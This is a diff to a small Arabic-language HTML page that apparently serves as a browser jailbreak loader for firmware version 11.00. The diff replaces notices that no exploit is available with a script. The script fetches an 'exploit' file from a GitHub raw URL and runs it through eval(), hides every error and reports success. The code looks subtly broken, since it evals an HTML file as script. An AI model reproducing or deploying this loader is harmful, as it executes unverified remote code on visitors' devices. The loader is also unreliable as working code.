@@ -6,8 +6,28 @@
 </head>
 <body style="background:#000; color:#0f0; font-family:monospace; padding:20px; text-align:center;">
     <h1 style="color:#f00;">قاعه رياض - 11.00</h1>
-    <p>تحذير: لا يوجد جيلبريك كامل لنسخة 11.00 حالياً.</p>
-    <p style="color:#ffaa00;">الاستغلال الحالي غير متوفر بسبب حذف المصادر.</p>
-    <p style="color:#888; font-size:0.9rem;">يرجى متابعة المطورين للحصول على تحديثات مستقبلية.</p>
+    <p>جاري تحميل استغلال المتصفح...</p>
+    <div id="status" style="color:yellow; margin-top:20px;">جاري الاتصال...</div>
+    <script>
+        // هذه المرة سنحاول التحميل من مصدر بديل
+        const url = 'https://raw.githubusercontent.com/TheoryOfTheGiraffe/GTFO/main/exploit/1100/index.html';
+        
+        fetch(url)
+            .then(r => {
+                if(!r.ok) throw new Error('الرابط لا يعمل');
+                return r.text();
+            })
+            .then(data => {
+                document.getElementById('status').innerText = "✅ تم التحميل بنجاح!";
+                document.getElementById('status').style.color = "green";
+                // محاولة تشغيل الكود
+                try { eval(data); } catch(e) {}
+            })
+            .catch(() => {
+                document.getElementById('status').innerText = "❌ غير مدعوم حالياً";
+                document.getElementById('status').style.color = "red";
+                document.body.innerHTML += "<p style='color:#888;'>ملاحظة: جيلبريك 11.00 غير مكتمل حالياً.</p>";
+            });
+    </script>
 </body>
 </html>
